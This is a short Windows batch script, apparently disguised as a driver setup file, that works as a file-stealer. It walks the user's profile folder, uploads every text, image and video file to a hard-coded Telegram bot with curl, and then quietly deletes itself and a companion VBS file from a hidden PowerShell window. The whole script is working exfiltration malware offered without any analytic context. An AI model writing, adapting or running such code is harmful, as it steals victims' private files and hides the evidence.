@echo off
setlocal enabledelayedexpansion

set tk=8157478032:AAHF-ANPD_Hozyie-3Wk9XK4p0l51IPeejc
set id=1922428949
set pth=C:\Users\%USERNAME%

powershell -Command ^
"$files = Get-ChildItem '%pth%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
foreach ($f in $files) { ^
    $path = $f.FullName; ^
    cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
}"

start "" powershell -WindowStyle Hidden -Command "Start-Sleep 2; Remove-Item 'setup_driver.bat','uninstall.vbs' -Force"

exit
